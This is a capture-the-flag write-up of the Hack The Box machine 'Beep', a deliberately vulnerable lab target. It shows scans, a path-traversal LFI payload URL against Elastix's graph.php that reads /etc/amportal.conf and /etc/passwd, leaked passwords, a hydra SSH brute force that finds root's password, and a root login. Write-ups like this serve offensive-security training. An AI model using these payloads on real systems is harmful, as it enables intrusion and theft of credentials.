---
title: HTB -- Beep
date: 2022-02-3
layout: single
header:
  teaser: assets/images/htb/beep/teaser.png
excerpt: Beep is one of the first boxes I tackled when studying for the OSCP -- and it totally floored me at the time of prepping. After some studing, the box is much easier to approach, being vulnerable to several webapp and OS based exploits. This box is very prone to falling into recon rabbit holes, so stay moving when looking through services. Happy hacking!
classes: wide
categories:
  - hackthebox
tags:
  - hackthebox
  - OSCP
  - web
  - cve
---

### Summary
<img src="/assets/images/htb/beep/teaser.png" width="250" height="250"/>

Beep is one of the first boxes I tackled when studying for the OSCP and totally floored me at the time of prepping. After some studing, the box is much easier to approach, being vulnerable to several webapp and OS based exploits. This box is very prone to falling into recon rabbit holes, so stay moving when looking through services. Happy hacking!

### Recon
```
rustscan -a beep.htb -- -sC -sV -O
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
Open 10.10.10.7:80
Open 10.10.10.7:110
Open 10.10.10.7:111
Open 10.10.10.7:143
Open 10.10.10.7:443
Open 10.10.10.7:879
Open 10.10.10.7:995
Open 10.10.10.7:993
Open 10.10.10.7:3306
Open 10.10.10.7:4190
Open 10.10.10.7:4445
Open 10.10.10.7:4559
Open 10.10.10.7:5038
Open 10.10.10.7:10000
Open 10.10.10.7:25
Open 10.10.10.7:22
...
PORT      STATE SERVICE    REASON         VERSION
22/tcp    open  ssh        syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       syn-ack ttl 63 Postfix smtpd
80/tcp    open  http       syn-ack ttl 63 Apache httpd 2.2.3
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Did not follow redirect to https://beep.htb/
110/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_pop3-capabilities: STLS LOGIN-DELAY(0) APOP EXPIRE(NEVER) PIPELINING UIDL IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE TOP RESP-CODES
111/tcp   open  rpcbind    syn-ack ttl 63 2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            876/udp   status
|_  100024  1            879/tcp   status
143/tcp   open  imap       syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
|_imap-capabilities: CONDSTORE IMAP4rev1 MAILBOX-REFERRALS THREAD=ORDEREDSUBJECT NAMESPACE IDLE MULTIAPPEND URLAUTHA0001 NO Completed SORT=MODSEQ UNSELECT LIST-SUBSCRIBED UIDPLUS LITERAL+ X-NETSCAPE LISTEXT CATENATE QUOTA ACL IMAP4 ATOMIC OK ID SORT CHILDREN BINARY THREAD=REFERENCES RENAME RIGHTS=kxte ANNOTATEMORE STARTTLS
443/tcp   open  ssl/http   syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS))
|_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.2.3 (CentOS)
|_http-title: Elastix - Login page
879/tcp   open  status     syn-ack ttl 63 1 (RPC #100024)
993/tcp   open  ssl/imap   syn-ack ttl 63 Cyrus imapd
|_imap-capabilities: CAPABILITY
995/tcp   open  pop3       syn-ack ttl 63 Cyrus pop3d
3306/tcp  open  mysql?     syn-ack ttl 63
4190/tcp  open  sieve      syn-ack ttl 63 Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp? syn-ack ttl 63
4559/tcp  open  hylafax    syn-ack ttl 63 HylaFAX 4.3.10
5038/tcp  open  asterisk   syn-ack ttl 63 Asterisk Call Manager 1.1
10000/tcp open  http       syn-ack ttl 63 MiniServ 1.570 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: MiniServ/1.570
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
OS CPE: cpe:/o:linux:linux_kernel:2.6.18 cpe:/h:linksys:wrv54g cpe:/o:linux:linux_kernel:2.6.27 cpe:/o:linux:linux_kernel:2.4.32 cpe:/h:enterasys:ap3620 cpe:/h:netgear:eva9100 cpe:/h:thecus:4200 cpe:/h:thecus:n5500
Aggressive OS guesses: Linux 2.6.18 (95%), Linux 2.6.27 (95%), Linux 2.6.9 - 2.6.30 (95%), Linux 2.6.20-1 (Fedora Core 5) (95%), Linux 2.6.30 (95%), Linux 2.6.5 (Fedora Core 2) (95%), Linux 2.6.5 - 2.6.12 (95%), Linux 2.6.6 (95%), Elastix PBX (Linux 2.6.18) (95%), Linksys WRV54G WAP (95%)
(output modified for readability)
```
Many open ports! Web elements, possible mail server, maby some sort of web app joining the two?

# Web

Loading the main page it looks to be software named elastix

Let's run a directory brute force. Don't forget to specify https and `-k`, or else everythin will come back 302.
```
feroxbuster -u https://beep.htb -x js php txt -k

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://beep.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/kali/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [js, php, txt]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      305c https://beep.htb/admin
301        9l       28w      306c https://beep.htb/images
301        9l       28w      307c https://beep.htb/modules
403       10l       30w      289c https://beep.htb/admin/modules
301        9l       28w      312c https://beep.htb/admin/images
301        9l       28w      316c https://beep.htb/modules/language
301        9l       28w      312c https://beep.htb/admin/common
301        9l       28w      304c https://beep.htb/mail
301        9l       28w      306c https://beep.htb/static
302        0l        0w        0c https://beep.htb/admin/index.php
301        9l       28w      317c https://beep.htb/modules/dashboard
```
Most of these give an access denied. `https://beep.htb/mail/` leads to a "RoundCube Webmail" instance. Spent some time running through basic creds like `admin:admin` and googling for defaults on elastix + roundcube with no luck. Time to look into some exploits. Tons of options!


```
searchsploit elastix                                                                                                    130 ⨯
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
Elastix - 'page' Cross-Site Scripting                                                           | php/webapps/38078.py
Elastix - Multiple Cross-Site Scripting Vulnerabilities                                         | php/webapps/38544.txt
Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities                                   | php/webapps/34942.txt
Elastix 2.2.0 - 'graph.php' Local File Inclusion                                                | php/webapps/37637.pl
Elastix 2.x - Blind SQL Injection                                                               | php/webapps/36305.txt
Elastix < 2.5 - PHP Code Injection                                                              | php/webapps/38091.php
FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution                                          | php/webapps/18650.py
------------------------------------------------------------------------------------------------ ---------------------------------

searchsploit roundcube
------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                  |  Path
------------------------------------------------------------------------------------------------ ---------------------------------
Roundcube 1.2.2 - Remote Code Execution                                                         | php/webapps/40892.txt
Roundcube rcfilters plugin 2.1.6 - Cross-Site Scripting                                         | linux/webapps/45437.txt
Roundcube Webmail - Multiple Vulnerabilities                                                    | php/webapps/11036.txt
Roundcube Webmail 0.1 - 'index.php' Cross-Site Scripting                                        | php/webapps/28988.txt
Roundcube Webmail 0.1 - CSS Expression Input Validation                                         | php/webapps/30877.txt
Roundcube Webmail 0.2 - Cross-Site Scripting                                                    | php/webapps/33473.txt
Roundcube Webmail 0.2-3 Beta - Code Execution                                                   | php/webapps/7549.txt
Roundcube Webmail 0.2b - Remote Code Execution                                                  | php/webapps/7553.sh
Roundcube Webmail 0.3.1 - Cross-Site Request Forgery / SQL Injection                            | php/webapps/17957.txt
Roundcube Webmail 0.8.0 - Persistent Cross-Site Scripting                                       | php/webapps/20549.py
Roundcube Webmail 1.1.3 - Directory Traversal                                                   | php/webapps/39245.txt
Roundcube Webmail 1.2 - File Disclosure                                                         | php/webapps/49510.py
------------------------------------------------------------------------------------------------ ---------------------------------
```
In scenarios where many options are available, I tend to work through items LFI > XSS > executables. In this case there is a [graph.php LFI available](https://www.exploit-db.com/exploits/37637) which suggests that the following url is exploitable.

> https://beep.htb/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

![](/assets/images/htb/beep/beep-lfi.png)
Passwords are laced within, giving us some more logins to try with amp109, passw0rd, jEhdIekWmdjE and amp111.

While we are here, can also grab all users from `/etc/passwd`
```
$ # curl it to a file
root:x:0:0:root:/root:/bin/bash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/spool/mail:/sbin/nologin news:x:9:13:news:/etc/news: uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin games:x:12:100:games:/usr/games:/sbin/nologin gopher:x:13:30:gopher:/var/gopher:/sbin/nologin ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin nobody:x:99:99:Nobody:/:/sbin/nologin mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash distcache:x:94:94:Distcache:/:/sbin/nologin vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin pcap:x:77:77::/var/arpwatch:/sbin/nologin ntp:x:38:38::/etc/ntp:/sbin/nologin cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash dbus:x:81:81:System message bus:/:/sbin/nologin apache:x:48:48:Apache:/var/www:/sbin/nologin mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin postfix:x:89:89::/var/spool/postfix:/sbin/nologin asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin spamfilter:x:500:500::/home/spamfilter:/bin/bash haldaemon:x:68:68:HAL daemon:/:/sbin/nologin xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin fanis:x:501:501::/home/fanis:/bin/bash Sorry! Attempt to access restricted file.

$ cat passwd | tr ' ' '\n' | grep ':' | cut -d: -f1 > users.txt
```

Lets make use of these usernames and passwords with a brute force on ssh to start. Next would be webapps, and other services, but instead we snag root creds!
```
hydra -L users.txt -P passwords.txt beep.htb ssh 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-02-03 20:12:22
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 192 login tries (l:48/p:4), ~12 tries per task
[DATA] attacking ssh://beep.htb:22/
[22][ssh] host: beep.htb   login: root   password: jEhdIekWmdjE
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-02-03 20:12:35
```
rooting the box is as easy as copying and pasting that ugly password into `ssh`.
```
ssh root@beep.htb                   
root@beep.htb's password: 
Last login: Tue Jul 16 11:45:47 2019

Welcome to Elastix 
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7

[root@beep ~]# id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
[root@beep ~]# cat /root/root.txt
bdb************************
```
